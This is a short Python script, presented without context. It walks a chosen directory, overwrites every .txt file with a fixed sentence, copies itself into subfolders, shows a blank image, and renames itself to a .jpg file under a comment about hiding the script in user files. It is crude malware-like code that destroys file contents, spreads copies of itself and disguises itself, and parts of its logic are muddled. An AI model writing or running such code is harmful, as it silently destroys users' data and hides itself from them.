import os
import shutil
from PIL import Image

# Navigate to the target directory
os.chdir('/path/to/target/directory')

# Modify files and create a copy of the script
for root, dirs, files in os.walk('.'):
    for file in files:
        if file.endswith('.txt'):
            with open(os.path.join(root, file), 'w') as f:
                f.write('This file has been modified by the script')
        elif file == 'script.py':
            shutil.copy('script.py', os.path.join(root, 'copy_of_script.py'))

# Create and display a random image
image = Image.new('RGB', (500, 500))
image.show()

# Hide the script in user files
with open('hidden_file.txt', 'w') as f:
    f.write('This file contains occult symbols and images')
os.rename('script.py', 'hidden_file.jpg')
